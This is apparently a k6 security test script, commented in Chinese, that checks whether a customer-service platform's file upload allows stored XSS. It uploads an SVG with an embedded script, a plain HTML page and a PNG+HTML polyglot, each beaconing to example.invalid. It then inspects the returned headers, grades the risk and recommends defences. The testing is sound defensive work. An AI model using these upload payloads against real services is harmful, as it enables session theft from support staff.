/**
 * 案例 2：存储型 XSS (Stored XSS)
 *
 * 已知后端防御：前台上传要求"合法栅格图片"，SVG/HTML 文本直接被 msgCode=20 拒绝；
 * 且文件存独立对象存储域(sit.arsaassit-pub.club, 非同源)、以 image/* 原样返回。
 * 因此攻击面收窄为"图片型绕过"：
 *   - PNG+HTML polyglot，文件名 .html：图片头合法能否骗过校验、并被当 html 返回
 *   - 合法 PNG 但文件名 .html/.svg：存储/返回时是否被赋予可执行 Content-Type
 *
 * 命中 XSS 的服务端必要条件（回取验证）：可执行 Content-Type(svg/html/xml) + 内联(非attachment) + 脚本原样保留。
 * 严重度再按存储域是否与后台同源加权。
 *
 * 判定：
 *   🔴 满足必要条件且与后台同源      → 直取客服会话
 *   🟠 满足必要条件但在独立OSS域     → 该域内执行(钓鱼/该域数据)
 *   🟡 仅内容嗅探可执行(缺 nosniff)  → 中危
 *   🟢 被拒 / 以图片类型返回 / 强制下载 → 通过
 *
 * 运行：k6 run -e TENANT_ID=3004 2_stored_xss.test.js
 */
import { sleep } from 'k6';
import { getSafeEnv, classifyOrigin, absoluteUrl, tenantId } from './lib/env.js';
import { getGuestToken } from './lib/guest.js';
import { frontendUpload, fetchBack } from './lib/uploadProbe.js';
import { appendAscii } from './lib/payloads.js';
import { RISK, reportCase, banner, sub } from './lib/report.js';

export const options = { vus: 1, iterations: 1 };

const NAME = 'Stored XSS';
const BASE_PNG = open('../tests/api/uploadFile/img/oneToone/1.png', 'b');

const rank = { PASS: 0, LOW: 1, INFO: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };

function payloads(run) {
    const mark = `K6ST_XSS_${run}`;
    const svg = `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="120" height="60"><script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script><rect width="120" height="60" fill="#39c"/></svg>`;
    const html = `<!doctype html><html><body>${mark}<script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script></body></html>`;
    const polyHtml = appendAscii(BASE_PNG, `\n<!--${mark}--><script>/*${mark}*/new Image().src='https://example.invalid/b?x=${mark}'</script>`);
    return { mark, list: [
        { desc: 'SVG内嵌脚本（对照，应被拒）',      content: svg,      fileName: `k6st_${run}.svg`,       contentType: 'image/svg+xml' },
        { desc: 'PNG+HTML polyglot 文件名.html',   content: polyHtml, fileName: `k6st_${run}p.html`,     contentType: 'text/html' },
        { desc: '合法PNG 文件名.html（扩展名保留）', content: BASE_PNG, fileName: `k6st_${run}.html`,      contentType: 'text/html' },
        { desc: '纯HTML文本（对照，应被拒）',        content: html,     fileName: `k6st_${run}b.html`,    contentType: 'text/html' },
    ] };
}

function analyze(fb, mark) {
    const ct = (fb.contentType || '').toLowerCase();
    return {
        ct,
        executableType: /svg|html|xml/.test(ct),
        imageType: /^image\//.test(ct) && !/svg/.test(ct),
        forcedDownload: /attachment/i.test(fb.contentDisposition || ''),
        nosniff: /nosniff/i.test(fb.xContentTypeOptions || ''),
        scriptIntact: fb.body.indexOf(mark) !== -1 && /<script|onerror=/i.test(fb.body),
    };
}

export function runCase(env, token) {
    banner('案例 2 · 存储型 XSS (Stored XSS)');
    const run = `${Date.now().toString(36)}${__VU}`;
    const { mark, list } = payloads(run);

    let worst = RISK.PASS;
    let hitRecommend = '';
    const evidence = [];

    for (const p of list) {
        sub(`变体：${p.desc}`);
        const up = frontendUpload(env, token, { content: p.content, fileName: p.fileName, contentType: p.contentType });
        if (!up.accepted) {
            console.log(`   ⛔ 拒绝 (code=${up.code}, msgCode=${up.msgCode}, msg=${up.msg})`);
            evidence.push(`${p.desc}: 拒绝 (msgCode=${up.msgCode} ${up.msg})`);
            sleep(1);
            continue;
        }
        const origin = classifyOrigin(up.src, env);
        console.log(`   ✔ 接受 → 存储名=${up.title} [${origin.kind}]`);
        const fb = fetchBack(absoluteUrl(up.src, env));
        const a = analyze(fb, mark);
        console.log(`     回取：http=${fb.status}, CT=${a.ct || '(空)'}, Disposition=${fb.contentDisposition || '无'}, nosniff=${a.nosniff}, 脚本保留=${a.scriptIntact}`);

        let risk = RISK.PASS, note = '';
        if (a.scriptIntact && !a.forcedDownload && a.executableType) {
            risk = origin.kind === 'same-origin-admin' ? RISK.CRITICAL : RISK.HIGH;
            note = `可执行CT(${a.ct})+内联+脚本保留 → 客服点开在 ${origin.srcHost} 域执行`;
            hitRecommend = '所有用户附件回取时强制 Content-Disposition: attachment + X-Content-Type-Options: nosniff，且仅以 image/* 之外一律 octet-stream；用独立无 Cookie 沙箱域托管。';
        } else if (a.scriptIntact && a.imageType && !a.nosniff && !a.forcedDownload) {
            risk = RISK.MEDIUM;
            note = `CT=${a.ct} 但缺 nosniff，旧浏览器可能内容嗅探执行`;
        } else if (a.forcedDownload) { risk = RISK.LOW; note = '强制下载，不内联渲染'; }
        else if (!a.scriptIntact) { risk = RISK.LOW; note = '脚本被清洗/图片被处理，标记丢失'; }
        else { risk = RISK.LOW; note = `以 ${a.ct} 返回，非可执行类型`; }

        console.log(`     → ${risk}：${note}`);
        evidence.push(`${p.desc}: ${risk} — ${note}`);
        if ((rank[risk] ?? 0) > (rank[worst] ?? 0)) worst = risk;
        sleep(1);
    }

    const verdict = {
        risk: worst,
        conclusion:
            worst === RISK.CRITICAL ? '脚本文件与后台同源内联渲染，客服点开即被窃取会话，严重存储型 XSS。'
            : worst === RISK.HIGH ? '脚本文件被内联渲染并原样执行，客服点开触发存储型 XSS。'
            : worst === RISK.MEDIUM ? '存在内容嗅探型 XSS 风险（缺少 nosniff）。'
            : '前台强制真实图片校验、以 image/* 类型从独立域返回，未发现可被客服浏览器执行的存储型 XSS。',
        evidence,
        recommendation: hitRecommend || '保持：拒绝非图片、以 image/* 返回、独立沙箱域托管；可再加 Content-Disposition: attachment 与 nosniff 兜底。',
    };
    return reportCase(NAME, { name: NAME, ...verdict });
}

export default function () {
    const env = getSafeEnv();
    runCase(env, getGuestToken(tenantId()));
}
